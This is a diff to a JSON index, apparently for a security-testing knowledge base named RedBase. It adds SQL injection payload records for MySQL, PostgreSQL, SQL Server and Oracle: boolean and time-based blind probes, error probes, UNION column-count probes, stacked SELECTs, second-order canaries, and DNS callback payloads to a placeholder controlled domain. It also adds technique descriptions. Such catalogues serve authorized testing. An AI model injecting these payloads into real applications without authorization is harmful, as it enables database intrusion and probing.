@@ -554,10 +554,1243 @@
       "technique_id": "web-server-side-ssrf-redirect-validation",
       "technology_versions": [],
       "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-boolean-blind-and-false-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "' AND 2<1-- ",
+      "encoding": "none",
+      "expected_behavior": "Tests a simple false comparison in a compatible string context. Compare multiple repetitions to reduce timing and content noise.",
+      "id": "web-sqli-boolean-blind-and-false-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "Boolean AND false condition",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-boolean-blind",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-boolean-blind-and-true-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "' AND 2>1-- ",
+      "encoding": "none",
+      "expected_behavior": "Tests a simple true comparison in a compatible string context. Database comment parsing and trailing syntax vary.",
+      "id": "web-sqli-boolean-blind-and-true-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "Boolean AND true condition",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-boolean-blind",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-boolean-blind-numeric-false-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": " AND 1=2",
+      "encoding": "none",
+      "expected_behavior": "A false predicate for a numeric SQL expression context. Use as a paired control with the corresponding true predicate.",
+      "id": "web-sqli-boolean-blind-numeric-false-001",
+      "injection_context": "numeric-expression",
+      "license": "pending-policy-review",
+      "name": "Numeric-context false predicate",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-boolean-blind",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-boolean-blind-numeric-true-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": " AND 1=1",
+      "encoding": "none",
+      "expected_behavior": "A true predicate for a numeric SQL expression context. The leading syntax must match the application's query structure.",
+      "id": "web-sqli-boolean-blind-numeric-true-001",
+      "injection_context": "numeric-expression",
+      "license": "pending-policy-review",
+      "name": "Numeric-context true predicate",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-boolean-blind",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-boolean-blind-string-false-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "' AND '1'='2'-- ",
+      "encoding": "none",
+      "expected_behavior": "A false predicate intended for a compatible quoted-string context. Response differences must be repeatable and attributable to the condition.",
+      "id": "web-sqli-boolean-blind-string-false-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "String-context false predicate",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-boolean-blind",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-boolean-blind-string-true-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "' AND '1'='1'-- ",
+      "encoding": "none",
+      "expected_behavior": "A true predicate intended for a compatible quoted-string context. Compare with the paired false predicate under identical conditions.",
+      "id": "web-sqli-boolean-blind-string-true-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "String-context true predicate",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-boolean-blind",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-error-based-mssql-convert-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "' AND CONVERT(INT,'redbase')=1-- ",
+      "encoding": "none",
+      "expected_behavior": "If evaluated in a compatible expression, SQL Server may raise a conversion error. Exact quoting and comment placement depend on the injection context.",
+      "id": "web-sqli-error-based-mssql-convert-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "SQL Server conversion error probe",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "Microsoft SQL Server",
+      "technique_id": "web-sqli-error-based",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-error-based-postgresql-cast-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "' AND CAST('redbase' AS INTEGER)=1-- ",
+      "encoding": "none",
+      "expected_behavior": "If evaluated in a compatible expression, PostgreSQL may raise an invalid-text-representation error. This is a DBMS-specific diagnostic probe, not a universal payload.",
+      "id": "web-sqli-error-based-postgresql-cast-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "PostgreSQL invalid integer cast probe",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "PostgreSQL",
+      "technique_id": "web-sqli-error-based",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-error-based-single-quote-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "'",
+      "encoding": "none",
+      "expected_behavior": "In a string-literal context, an unmatched quote may cause a SQL syntax error. Error visibility depends on application error handling.",
+      "id": "web-sqli-error-based-single-quote-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "Unmatched single-quote syntax probe",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-error-based",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-error-based-unmatched-parenthesis-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "')",
+      "encoding": "none",
+      "expected_behavior": "May disrupt a parenthesized expression. The result depends on the surrounding SQL grammar and should be interpreted only alongside a baseline.",
+      "id": "web-sqli-error-based-unmatched-parenthesis-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "Unmatched parenthesis syntax probe",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-error-based",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-out-of-band-mssql-dns-canary-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "'; EXEC master..xp_dirtree '\\\\<unique-id>.<controlled-domain>\\a'-- ",
+      "encoding": "none",
+      "expected_behavior": "On eligible SQL Server configurations with sufficient permissions and outbound name resolution, this may cause a DNS lookup. A callback proves name resolution only; never place query data or secrets in the hostname. High-privilege feature availability varies.",
+      "id": "web-sqli-out-of-band-mssql-dns-canary-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "SQL Server DNS-only canary",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-dirtree-transact-sql"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "Microsoft SQL Server",
+      "technique_id": "web-sqli-out-of-band",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-out-of-band-oracle-dns-canary-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "' AND UTL_INADDR.get_host_address('<unique-id>.<controlled-domain>') IS NOT NULL-- ",
+      "encoding": "none",
+      "expected_behavior": "On eligible Oracle configurations where the account has required privileges and DNS egress is permitted, this may trigger name resolution. A callback proves resolution only; do not encode query output or secrets.",
+      "id": "web-sqli-out-of-band-oracle-dns-canary-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "Oracle DNS-only canary",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://docs.oracle.com/en/database/oracle/oracle-database/23/arpls/UTL_INADDR.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "Oracle Database",
+      "technique_id": "web-sqli-out-of-band",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-second-order-boolean-canary-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "redbase' OR '1'='1",
+      "encoding": "none",
+      "expected_behavior": "A test string for tracing a stored value into a later query. Use only with test data; confirm the later query is parameterized or safely constructed.",
+      "id": "web-sqli-second-order-boolean-canary-001",
+      "injection_context": "stored-field",
+      "license": "pending-policy-review",
+      "name": "Stored Boolean-context canary",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-second-order",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-second-order-comment-canary-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "redbase'-- ",
+      "encoding": "none",
+      "expected_behavior": "A marker for tracing stored input through later SQL construction. Comment behavior is DBMS- and context-dependent.",
+      "id": "web-sqli-second-order-comment-canary-001",
+      "injection_context": "stored-field",
+      "license": "pending-policy-review",
+      "name": "Stored comment-syntax canary",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-second-order",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-second-order-quote-canary-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "redbase'canary",
+      "encoding": "none",
+      "expected_behavior": "A benign marker containing a quote to trace through storage and later use. It does not prove SQLi unless a later query incorporates it unsafely.",
+      "id": "web-sqli-second-order-quote-canary-001",
+      "injection_context": "stored-field",
+      "license": "pending-policy-review",
+      "name": "Stored quote canary",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-second-order",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-stacked-queries-mssql-select-canary-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "'; SELECT 'REDBASE_CANARY'-- ",
+      "encoding": "none",
+      "expected_behavior": "Attempts a second, read-only constant SELECT. It is only a structural test; many application drivers reject multiple statements.",
+      "id": "web-sqli-stacked-queries-mssql-select-canary-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "SQL Server harmless stacked SELECT",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "Microsoft SQL Server",
+      "technique_id": "web-sqli-stacked-queries",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-stacked-queries-mysql-select-canary-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "'; SELECT 'REDBASE_CANARY'-- ",
+      "encoding": "none",
+      "expected_behavior": "Attempts a second, read-only constant SELECT. Support depends on connector configuration and API; do not assume multi-statements are enabled.",
+      "id": "web-sqli-stacked-queries-mysql-select-canary-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "MySQL harmless stacked SELECT",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "MySQL/MariaDB",
+      "technique_id": "web-sqli-stacked-queries",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-stacked-queries-postgresql-select-canary-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "'; SELECT 'REDBASE_CANARY'-- ",
+      "encoding": "none",
+      "expected_behavior": "Attempts a second, read-only constant SELECT where the driver and query interface permit multiple statements.",
+      "id": "web-sqli-stacked-queries-postgresql-select-canary-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "PostgreSQL harmless stacked SELECT",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "PostgreSQL",
+      "technique_id": "web-sqli-stacked-queries",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-time-blind-mssql-waitfor-3s-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "'; WAITFOR DELAY '00:00:03'-- ",
+      "encoding": "none",
+      "expected_behavior": "Requests a three-second delay where stacked statements are permitted. Driver settings and query context may reject it.",
+      "id": "web-sqli-time-blind-mssql-waitfor-3s-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "SQL Server short WAITFOR probe",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "Microsoft SQL Server",
+      "technique_id": "web-sqli-time-blind",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-time-blind-mysql-conditional-3s-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "' AND IF(1=1,SLEEP(3),0)-- ",
+      "encoding": "none",
+      "expected_behavior": "Illustrates a conditional short delay in a compatible expression context. Use low request volume and stop if service latency rises.",
+      "id": "web-sqli-time-blind-mysql-conditional-3s-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "MySQL conditional delay probe",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "MySQL/MariaDB",
+      "technique_id": "web-sqli-time-blind",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-time-blind-mysql-sleep-3s-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "' AND SLEEP(3)-- ",
+      "encoding": "none",
+      "expected_behavior": "Requests a short delay if the expression is evaluated. Query context, server limits, and request timeouts affect observability.",
+      "id": "web-sqli-time-blind-mysql-sleep-3s-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "MySQL short delay expression",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "MySQL/MariaDB",
+      "technique_id": "web-sqli-time-blind",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-time-blind-postgresql-conditional-3s-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NULL-- ",
+      "encoding": "none",
+      "expected_behavior": "Illustrates a conditional short delay. Expression compatibility depends on query context and PostgreSQL version; validate syntax in a local lab before use.",
+      "id": "web-sqli-time-blind-postgresql-conditional-3s-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "PostgreSQL conditional delay probe",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "PostgreSQL",
+      "technique_id": "web-sqli-time-blind",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-time-blind-postgresql-sleep-3s-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "';SELECT pg_sleep(3)-- ",
+      "encoding": "none",
+      "expected_behavior": "Requests a three-second delay if stacked statements are accepted and pg_sleep is available. Driver multi-statement behavior may prevent execution. Use only in a controlled test environment.",
+      "id": "web-sqli-time-blind-postgresql-sleep-3s-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "PostgreSQL short delay probe",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "PostgreSQL",
+      "technique_id": "web-sqli-time-blind",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-union-based-canary-string-two-columns-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "' UNION SELECT NULL,'REDBASE_CANARY'-- ",
+      "encoding": "none",
+      "expected_behavior": "A harmless marker can help identify a reflected column if the original query has two compatible columns. Replace only with a unique non-sensitive marker in a test system.",
+      "id": "web-sqli-union-based-canary-string-two-columns-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "UNION non-sensitive canary marker (two columns)",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-union-based",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-union-based-null-1-columns-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "' UNION SELECT NULL-- ",
+      "encoding": "none",
+      "expected_behavior": "Tests whether a UNION SELECT with 1 NULL expression(s) is syntactically compatible. A successful response is not by itself proof that a particular column is reflected.",
+      "id": "web-sqli-union-based-null-1-columns-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "UNION NULL column-count probe (1)",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-union-based",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-union-based-null-2-columns-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "' UNION SELECT NULL, NULL-- ",
+      "encoding": "none",
+      "expected_behavior": "Tests whether a UNION SELECT with 2 NULL expression(s) is syntactically compatible. A successful response is not by itself proof that a particular column is reflected.",
+      "id": "web-sqli-union-based-null-2-columns-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "UNION NULL column-count probe (2)",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-union-based",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-union-based-null-3-columns-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "' UNION SELECT NULL, NULL, NULL-- ",
+      "encoding": "none",
+      "expected_behavior": "Tests whether a UNION SELECT with 3 NULL expression(s) is syntactically compatible. A successful response is not by itself proof that a particular column is reflected.",
+      "id": "web-sqli-union-based-null-3-columns-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "UNION NULL column-count probe (3)",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-union-based",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-union-based-null-4-columns-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "' UNION SELECT NULL, NULL, NULL, NULL-- ",
+      "encoding": "none",
+      "expected_behavior": "Tests whether a UNION SELECT with 4 NULL expression(s) is syntactically compatible. A successful response is not by itself proof that a particular column is reflected.",
+      "id": "web-sqli-union-based-null-4-columns-001",
+      "injection_context": "quoted-string",
+      "license": "pending-policy-review",
+      "name": "UNION NULL column-count probe (4)",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-union-based",
+      "technology_versions": [],
+      "waf_bypass_for": []
+    },
+    {
+      "_path": "payloads/web/sqli/web-sqli-union-based-numeric-context-one-column-001.yaml",
+      "_record_type": "payload",
+      "adapted_from": null,
+      "content": "0 UNION SELECT NULL-- ",
+      "encoding": "none",
+      "expected_behavior": "Illustrates a UNION probe in a numeric expression context. It is only applicable if the original query structure and column count are compatible.",
+      "id": "web-sqli-union-based-numeric-context-one-column-001",
+      "injection_context": "numeric-expression",
+      "license": "pending-policy-review",
+      "name": "UNION numeric-context column probe",
+      "references": [
+        "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "related_payload": null,
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "target_technology": "generic",
+      "technique_id": "web-sqli-union-based",
+      "technology_versions": [],
+      "waf_bypass_for": []
     }
   ],
   "project": "RedBase",
   "techniques": [
+    {
+      "_path": "knowledge/web/injection/sqli/web-sqli-boolean-blind.yaml",
+      "_record_type": "technique",
+      "adapted_from": null,
+      "category": "injection",
+      "classification": {
+        "cwe": [
+          "CWE-89"
+        ],
+        "owasp": [
+          "A03:2021-Injection"
+        ]
+      },
+      "description": "SQL injection in which a true or false SQL condition changes an observable application response even though query results or database errors are not directly disclosed.",
+      "domain": "web",
+      "id": "web-sqli-boolean-blind",
+      "license": "CC-BY-4.0",
+      "maturity": "core",
+      "name": "Boolean-Based Blind SQL Injection",
+      "payload_refs": [
+        "web-sqli-boolean-blind-string-true-001",
+        "web-sqli-boolean-blind-string-false-001",
+        "web-sqli-boolean-blind-numeric-true-001",
+        "web-sqli-boolean-blind-numeric-false-001",
+        "web-sqli-boolean-blind-and-true-001",
+        "web-sqli-boolean-blind-and-false-001"
+      ],
+      "related_techniques": [
+        "web-sqli-time-blind",
+        "web-sqli-error-based"
+      ],
+      "requirements": [
+        "An application feature constructs or executes SQL using input influenced by the requester."
+      ],
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "subcategory": "sql-injection/boolean-based-blind",
+      "tags": [
+        "sqli",
+        "blind",
+        "boolean",
+        "response-differential"
+      ],
+      "target_technologies": [
+        "MySQL/MariaDB",
+        "PostgreSQL",
+        "Microsoft SQL Server",
+        "Oracle Database",
+        "SQLite"
+      ],
+      "technology_versions": []
+    },
+    {
+      "_path": "knowledge/web/injection/sqli/web-sqli-error-based.yaml",
+      "_record_type": "technique",
+      "adapted_from": null,
+      "category": "injection",
+      "classification": {
+        "cwe": [
+          "CWE-89"
+        ],
+        "owasp": [
+          "A03:2021-Injection"
+        ]
+      },
+      "description": "SQL injection in which database or application errors reveal information about query parsing, data types, or query execution.",
+      "domain": "web",
+      "id": "web-sqli-error-based",
+      "license": "CC-BY-4.0",
+      "maturity": "core",
+      "name": "Error-Based SQL Injection",
+      "payload_refs": [
+        "web-sqli-error-based-single-quote-001",
+        "web-sqli-error-based-unmatched-parenthesis-001",
+        "web-sqli-error-based-postgresql-cast-001",
+        "web-sqli-error-based-mssql-convert-001"
+      ],
+      "related_techniques": [
+        "web-sqli-union-based",
+        "web-sqli-boolean-blind"
+      ],
+      "requirements": [
+        "An application feature constructs or executes SQL using input influenced by the requester."
+      ],
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
